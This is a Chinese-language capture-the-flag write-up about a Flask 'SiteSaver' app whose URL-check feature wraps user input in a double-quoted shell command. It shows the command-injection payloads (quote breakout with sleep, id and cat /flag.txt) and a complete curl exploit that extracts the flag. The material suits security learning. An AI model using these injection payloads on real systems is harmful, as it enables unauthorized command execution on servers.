## 题解

### 入口与指纹

Flask 应用（`SiteSaver`），`/` 列出已保存站点，`/add_url` 表单只收 `url`，
删除是 `POST /delete_url/<id>`。

### 关键观察

**1. `/add_url` 会「检查 URL 状态」，并把结果写进提示。**

```json
{"message":"URL status was checked and returned 200 status, Saved successfully!"}
```

`http://127.0.0.1:5003/` 成功，`http://127.0.0.1:5003/flag.txt`（404）失败，
说明它是真的发了一次请求并按状态码判断。

**2. 首页预置的数据里藏了一条提示。**

```text
http://example.com"; cat flag.txt #
```

这说明 URL 被拼进**双引号包裹的 shell 命令**（类似 `curl "...$url"`）。

**3. 双引号即可跳出，命令输出直接回显在 `message` 里。**

```bash
url = http://127.0.0.1:5003/"; sleep 4; #
→ time_total 4.2s
url = http://127.0.0.1:5003/"; id; #
→ "URL status was checked and returned 200uid=0(root)..."
```

### 利用链

```bash
T=$(head -1 .target)
curl -sS -X POST \
  --data-urlencode 'url=http://127.0.0.1:5003/"; cat /flag.txt; #' \
  "http://$T/add_url" | grep -o 'flag{[^}]*}'
```

（`/app/flag.txt` 是同一份文件。）

### flag 位置

容器内 `/flag.txt`；通过命令注入的 stdout 出现在 `message` 字段。

## 复盘

- **预置数据可以当字典看。** 首页那条 `"; cat flag.txt #` 就是作者给的 payload 形状。
- **注入点不一定在表单字段本身。** 这里的参数是「要被请求的 URL」，先做 SSRF 检查、
  再用 shell 包装，结果落进 shell。
- **`sleep` 是确认注入最快的手段**（4.2s vs 0.09s），比猜回显位置可靠。
- 回显直接拼在 `returned 200` 和 `status` 之间，注意别被文案干扰。
